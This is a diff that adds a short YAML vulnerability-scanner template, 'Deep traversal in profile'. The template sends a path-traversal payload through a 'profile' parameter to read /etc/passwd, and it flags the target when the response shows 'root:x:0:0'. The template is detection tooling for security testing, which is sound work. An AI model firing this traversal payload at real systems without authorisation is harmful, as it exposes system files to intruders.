@@ -1,0 +1,20 @@
+id: lfi7-450
+name: 'Deep traversal in profile'
+severity: high
+type: active
+tags:
+  - lfi
+  - traversal
+  - file
+description: 'Reads sensitive file via profile'
+requests:
+  - method: GET
+    path: '{{BaseURL}}'
+    payloads:
+      profile:
+        - '../../../../../../../../../../../etc/passwd'
+    matchers:
+      - type: word
+        part: body
+        words:
+          - 'root:x:0:0'
